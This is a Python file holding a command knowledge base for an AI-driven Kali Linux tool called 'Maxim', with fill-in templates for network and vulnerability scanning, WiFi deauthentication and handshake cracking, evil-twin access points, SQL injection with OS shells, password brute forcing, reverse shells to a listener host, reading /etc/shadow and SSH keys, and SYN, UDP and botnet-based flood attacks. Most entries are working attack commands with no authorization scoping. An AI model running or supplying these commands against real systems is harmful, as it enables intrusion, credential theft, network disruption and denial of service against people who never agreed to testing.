"""
Maxim Command Knowledge Base — exact, tested commands for Kali Linux.
The AI uses this as reference to give precise commands instead of guessing.
"""

COMMAND_KB = """
=== NETWORK SCANNING ===
Scan target (full): nmap -sV -sC -O -A {target}
Quick scan: nmap -T4 -F {target}
Scan all ports: nmap -p- {target}
Scan UDP ports: sudo nmap -sU --top-ports 100 {target}
Scan subnet/discover hosts: sudo nmap -sn {subnet}
Aggressive scan: nmap -A -T4 {target}
Scan specific ports: nmap -p 80,443,8080 {target}
OS detection: sudo nmap -O {target}
Service version: nmap -sV {target}
Script scan: nmap --script=vuln {target}
Stealth scan: sudo nmap -sS -T2 {target}
Fast mass scan: sudo masscan -p1-65535 --rate=1000 {target}
ARP scan local network: sudo arp-scan -l
Netdiscover: sudo netdiscover -r {subnet}
Ping sweep: nmap -sn -PE {subnet}

=== WIFI / WIRELESS ===
List wireless interfaces: iwconfig
Check interface mode: iwconfig wlan0
Enable monitor mode: sudo airmon-ng check kill && sudo airmon-ng start wlan0
Disable monitor mode: sudo airmon-ng stop wlan0mon && sudo systemctl restart NetworkManager
Kill interfering processes: sudo airmon-ng check kill
Scan WiFi networks: sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo airodump-ng wlan0mon
Restore network after monitor mode: sudo airmon-ng stop wlan0mon && sudo systemctl restart NetworkManager && sudo systemctl restart wpa_supplicant
Fix network down: sudo systemctl restart NetworkManager && sudo systemctl restart wpa_supplicant && sudo dhclient
Scan specific channel: sudo airodump-ng -c {channel} wlan0mon
Target specific AP: sudo airodump-ng -c {channel} --bssid {bssid} -w capture wlan0mon
Deauth attack: sudo aireplay-ng --deauth 0 -a {bssid} wlan0mon
Deauth specific client: sudo aireplay-ng --deauth 10 -a {bssid} -c {client_mac} wlan0mon
Crack WPA handshake: sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
Crack WPA with hashcat: hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
Convert cap to hashcat: hcxpcapngtool -o capture.hc22000 capture-01.cap
Auto WiFi attack: sudo wifite -i wlan0mon
WPS attack: sudo reaver -i wlan0mon -b {bssid} -vv
WPS scan: sudo wash -i wlan0mon
Change MAC: sudo macchanger -r wlan0
Restore MAC: sudo macchanger -p wlan0
Scan WiFi with bettercap: sudo bettercap -iface wlan0mon
Create evil twin: sudo airbase-ng -a {bssid} --essid "{ssid}" -c {channel} wlan0mon

=== VULNERABILITY SCANNING ===
Full vuln scan (nmap): nmap -sV --script=vuln {target}
Nmap all vuln scripts: nmap -sV --script=vuln,exploit,auth {target}
Nmap specific CVE check: nmap --script=http-vuln-* {target}
Nmap SMB vulns: nmap --script=smb-vuln* -p 445 {target}
Nmap SSL vulns: nmap --script=ssl-heartbleed,ssl-poodle,ssl-ccs-injection -p 443 {target}
Nmap HTTP vulns: nmap --script=http-vuln-cve2017-5638,http-vuln-cve2014-3704,http-shellshock -p 80,443,8080 {target}
Nmap FTP vulns: nmap --script=ftp-vsftpd-backdoor,ftp-proftpd-backdoor -p 21 {target}
Nmap DNS vulns: nmap --script=dns-zone-transfer,dns-recursion -p 53 {target}
OpenVAS scan: sudo gvm-start && gvm-cli socket --xml '<create_task><name>Scan</name><target><hosts>{target}</hosts></target></create_task>'
Nikto web vuln scan: nikto -h {url} -output nikto_report.html -Format html
Nikto with tuning: nikto -h {url} -Tuning 123bde
Nikto SSL: nikto -h {url} -ssl
Vulnerability scan target: nmap -sV --script=vuln -oN vuln_report.txt {target}
Vuln scan all ports: nmap -sV -p- --script=vuln {target}
Check for EternalBlue: nmap --script=smb-vuln-ms17-010 -p 445 {target}
Check for BlueKeep: nmap --script=rdp-vuln-ms12-020 -p 3389 {target}
Check Log4Shell: nmap --script=http-log4shell -p 80,443,8080 {target}
Scan for default creds: nmap --script=http-default-accounts -p 80,443,8080 {target}
Scan for shellshock: nmap --script=http-shellshock --script-args uri=/cgi-bin/test -p 80 {target}

=== WEB APPLICATION TESTING ===
Scan website: nikto -h {url}
Full web recon: whatweb -a 3 {url} && nikto -h {url} && gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt
Directory bruteforce: gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt
Directory with extensions: gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old,zip
Big wordlist dir scan: gobuster dir -u {url} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
FFUF fuzzing: ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirb/common.txt
FFUF with extensions: ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.bak
FFUF filter by size: ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 0
FFUF POST fuzzing: ffuf -u {url} -w /usr/share/wordlists/dirb/common.txt -X POST -d "user=FUZZ&pass=test" -fc 401
Subdomain enum: ffuf -u http://FUZZ.{domain} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301,302
Subdomain with amass: amass enum -d {domain}
Subdomain with sublist3r: sublist3r -d {domain}
SQL injection test: sqlmap -u "{url}?id=1" --batch --dbs
SQL injection POST: sqlmap -u "{url}" --data="user=admin&pass=test" --batch --dbs
SQL injection cookie: sqlmap -u "{url}" --cookie="PHPSESSID=abc123" --batch --dbs
SQL injection auto forms: sqlmap -u "{url}" --forms --batch --dbs
SQL injection with tamper: sqlmap -u "{url}?id=1" --batch --dbs --tamper=space2comment
Dump database: sqlmap -u "{url}?id=1" --batch -D {dbname} --dump
SQL injection OS shell: sqlmap -u "{url}?id=1" --batch --os-shell
XSS scan: dalfox url "{url}?q=test"
XSS scan with params: dalfox url "{url}" -p id,name,search
WordPress scan: wpscan --url {url} --enumerate vp,vt,u
WordPress full enum: wpscan --url {url} --enumerate vp,vt,u,tt,cb,dbe --plugins-detection aggressive
WordPress brute: wpscan --url {url} -U admin -P /usr/share/wordlists/rockyou.txt
Joomla scan: joomscan -u {url}
Drupal scan: droopescan scan drupal -u {url}
CMS detection: whatweb {url}
SSL scan: sslscan {target}
SSL detailed: testssl.sh {url}
Web tech detection: whatweb -a 3 {url}
WAF detection: wafw00f {url}
HTTP methods test: nmap --script=http-methods -p 80,443 {target}
Crawl website: gospider -s {url} -o output -c 10 -d 3
Screenshot website: cutycapt --url={url} --out=screenshot.png
API fuzzing: ffuf -u {url}/api/FUZZ -w /usr/share/wordlists/dirb/common.txt
LFI test: ffuf -u "{url}?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fc 404
SSRF test: ffuf -u "{url}?url=FUZZ" -w /usr/share/seclists/Fuzzing/SSRF/SSRF-Jhaddix.txt -fc 404
Open redirect: ffuf -u "{url}?redirect=FUZZ" -w /usr/share/seclists/Fuzzing/open-redirect-payloads.txt -fc 404
Nuclei scan: nuclei -u {url} -t cves/ -o nuclei_results.txt
Nuclei all templates: nuclei -u {url} -severity critical,high,medium -o nuclei_results.txt
Nuclei target list: nuclei -l targets.txt -severity critical,high -o nuclei_results.txt

=== VULNERABILITY DATABASES / SEARCH ===
Search exploits: searchsploit {query}
Search exploits detailed: searchsploit -v {query}
Copy exploit locally: searchsploit -m {exploit_id}
Examine exploit: searchsploit -x {exploit_id}
Search CVE with nmap: nmap -sV --script=vulscan/vulscan.nse {target}
Update searchsploit: searchsploit -u

=== PASSWORD CRACKING ===
Crack hash with john: john --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}
John show results: john --show {hashfile}
Hashcat MD5: hashcat -m 0 {hashfile} /usr/share/wordlists/rockyou.txt
Hashcat SHA256: hashcat -m 1400 {hashfile} /usr/share/wordlists/rockyou.txt
Hashcat NTLM: hashcat -m 1000 {hashfile} /usr/share/wordlists/rockyou.txt
Identify hash: hashid {hash}
Identify hash v2: hash-identifier
Hydra SSH brute: hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target}
Hydra FTP brute: hydra -l {user} -P /usr/share/wordlists/rockyou.txt ftp://{target}
Hydra HTTP POST: hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
Hydra RDP brute: hydra -l {user} -P /usr/share/wordlists/rockyou.txt rdp://{target}
Medusa SSH: medusa -h {target} -u {user} -P /usr/share/wordlists/rockyou.txt -M ssh
CrackMapExec SMB: crackmapexec smb {target} -u {user} -p /usr/share/wordlists/rockyou.txt

=== EXPLOITATION ===
Start Metasploit: msfconsole
Search exploits: searchsploit {query}
Copy exploit: searchsploit -m {exploit_id}
Generate reverse shell (Linux): msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf
Generate reverse shell (Windows): msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe
Generate PHP shell: msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -o shell.php
Netcat listener: nc -lvnp {lport}
Netcat reverse shell: nc -e /bin/bash {lhost} {lport}
Bash reverse shell: bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
Python reverse shell: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
Start handler: msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit"

=== ENUMERATION ===
SMB enum: enum4linux -a {target}
SMB shares: smbclient -L //{target} -N
SMB connect: smbclient //{target}/{share} -U {user}
SNMP walk: snmpwalk -v2c -c public {target}
DNS zone transfer: dig axfr {domain} @{target}
DNS enum: dnsenum {domain}
LDAP search: ldapsearch -x -H ldap://{target} -b "dc=domain,dc=com"
NFS shares: showmount -e {target}
RPC info: rpcclient -U "" -N {target}
Finger users: finger @{target}

=== STRESS TESTING / DoS ===
Ping flood: sudo ping -f {target}
Ping of death (oversized): sudo ping -s 65500 -c 100 {target}
Ping flood with size: sudo ping -f -s 65500 {target}
Ping flood count: sudo ping -f -c 10000 {target}
Hping3 SYN flood: sudo hping3 -S --flood -V -p 80 {target}
Hping3 SYN flood random source: sudo hping3 -S --flood --rand-source -p 80 {target}
Hping3 ICMP flood: sudo hping3 --icmp --flood {target}
Hping3 UDP flood: sudo hping3 --udp --flood -p 53 {target}
Slowloris (HTTP): slowloris {target} -p 80 -s 500
UFONet launch: ufonet -a {target} -r 100
UFONet with rounds: ufonet -a {target} -r 500 --threads 200
UFONet search zombies: ufonet -s "dork" --auto
UFONet download zombies: ufonet --download-zombies
UFONet test zombies: ufonet --test-all
UFONet list zombies: ufonet --list-zombies
UFONet web GUI: ufonet --gui
UFONet update: ufonet --update
UFONet attack methods: ufonet -a {target} --db
UFONet LOIC mode: ufonet -a {target} --loic 100
UFONet LORIS mode: ufonet -a {target} --loris 100
UFONet TCP flood: ufonet -a {target} --tcp 100
UFONet UDP flood: ufonet -a {target} --udp 100
Install UFONet: sudo apt-get install -y ufonet || cd /opt && sudo git clone https://github.com/epsylon/ufonet.git && cd ufonet && sudo python3 setup.py install
Install hping3: sudo apt-get install -y hping3
Install slowloris: sudo pip3 install slowloris

=== SNIFFING / MITM ===
Capture packets: sudo tcpdump -i {iface} -w capture.pcap
Capture HTTP: sudo tcpdump -i {iface} -A port 80
ARP spoof: sudo arpspoof -i {iface} -t {target} {gateway}
Enable IP forwarding: sudo sysctl -w net.ipv4.ip_forward=1
Ettercap MITM: sudo ettercap -T -M arp:remote /{target}// /{gateway}//
Bettercap MITM: sudo bettercap -iface {iface} -eval "net.probe on; net.sniff on; arp.spoof on; set arp.spoof.targets {target}"
Responder: sudo responder -I {iface} -wrf
Wireshark: wireshark

=== POST EXPLOITATION ===
Upgrade shell: python3 -c 'import pty;pty.spawn("/bin/bash")'
LinPEAS: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
Find SUID: find / -perm -4000 -type f 2>/dev/null
Find writable dirs: find / -writable -type d 2>/dev/null
Capabilities: getcap -r / 2>/dev/null
Cron jobs: cat /etc/crontab; ls -la /etc/cron.*
SSH keys: find / -name authorized_keys -o -name id_rsa 2>/dev/null
Password files: cat /etc/passwd; cat /etc/shadow
Network connections: ss -tlnp; netstat -tlnp
Running processes: ps aux --sort=-%mem
System info: uname -a; cat /etc/os-release
Users: cat /etc/passwd | grep -v nologin

=== ANONYMITY ===
Start Tor: sudo service tor start
Check Tor: curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip
Proxychains: proxychains4 {command}
Change MAC: sudo macchanger -r {iface}

=== SYSTEM ADMIN ===
Create desktop icon: printf '[Desktop Entry]\\nType=Application\\nName={name}\\nExec={exec}\\nIcon={icon}\\nTerminal=false\\nCategories=Utility;' > ~/Desktop/{name}.desktop && chmod +x ~/Desktop/{name}.desktop
Install package: sudo apt-get install -y {package}
Update system: sudo apt-get update && sudo apt-get upgrade -y
Check IP: ip -c addr show
Check ports: ss -tlnp
Check processes: ps aux --sort=-%mem | head -20
Check disk: df -h
Check memory: free -h
Check routes: ip route show
Start service: sudo systemctl start {service}
Stop service: sudo systemctl stop {service}
Restart service: sudo systemctl restart {service}
Enable service: sudo systemctl enable {service}
Check firewall: sudo iptables -L -n
Add firewall rule: sudo iptables -A INPUT -p tcp --dport {port} -j ACCEPT
Kill process: kill -9 {pid}
Find files: find / -name "{filename}" 2>/dev/null
Check connections: ss -tulnp
Download file: wget {url} -O {output}

=== FULL VULNERABILITY ASSESSMENT WORKFLOWS ===
Quick vuln test website: whatweb -a 3 {url} && nikto -h {url} && nmap -sV --script=vuln {target}
Full vuln test target: nmap -sV -sC -O -A -p- {target} -oN full_scan.txt && nmap --script=vuln {target} -oN vuln_scan.txt
Web app full test: whatweb {url} && wafw00f {url} && nikto -h {url} && gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt && sqlmap -u "{url}" --forms --batch --dbs
WordPress full test: wpscan --url {url} --enumerate vp,vt,u,tt,cb,dbe --plugins-detection aggressive
Network full assessment: sudo nmap -sn {subnet} -oN hosts.txt && nmap -sV -sC -iL hosts.txt --script=vuln -oN network_vuln.txt
SMB full test: enum4linux -a {target} && nmap --script=smb-vuln* -p 445 {target} && smbclient -L //{target} -N
SSL full test: sslscan {target} && nmap --script=ssl-heartbleed,ssl-poodle,ssl-ccs-injection -p 443 {target}
"""
